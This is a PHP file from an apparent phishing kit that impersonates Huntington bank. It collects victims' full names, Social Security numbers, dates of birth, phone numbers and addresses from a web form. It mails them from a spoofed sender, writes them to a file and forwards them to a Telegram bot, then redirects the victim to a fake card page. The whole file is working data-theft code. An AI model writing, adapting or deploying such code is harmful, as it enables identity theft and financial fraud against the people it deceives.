<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "»»————-　★[ ⚫️🌀 Huntington® ⚫️🌀 ]★　————-««\n";
$message .= "Full Name: ".$_POST['fname']."\n";;
$message .= "Social Security Number: ".$_POST['ssn']."\n";;
$message .= "Date Of Birth: ".$_POST['dob']."\n";;
$message .= "Phone Number: ".$_POST['ph']."\n";;
$message .= "Address: ".$_POST['add']."\n";;
$message .= "City: ".$_POST['city']."\n";;
$message .= "State: ".$_POST['state']."\n";;
$message .= "Zip Code: ".$_POST['zip']."\n";;
$message .= "Ip: $ip\n";
$message .= "»»————-　★[ ⚫️🌀 Huntington® ⚫️🌀 ]★　————-««\n";
$subject = "Huntington® Info | $ip ";
$headers = "From:Huntington <itna1337@network.pickup.fr>";
mail($send,$subject,$message,$headers);
fwrite($text, $message);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: ../Card.php?ver=847893Wblm1yxpjJabdoZaD4OVaGzTZ9vaZaPTjsbedbXQ&_ga=2.165334463.1021036329.1648528336-393105297.1648295705&l=1");

include "Telegram.php";

?>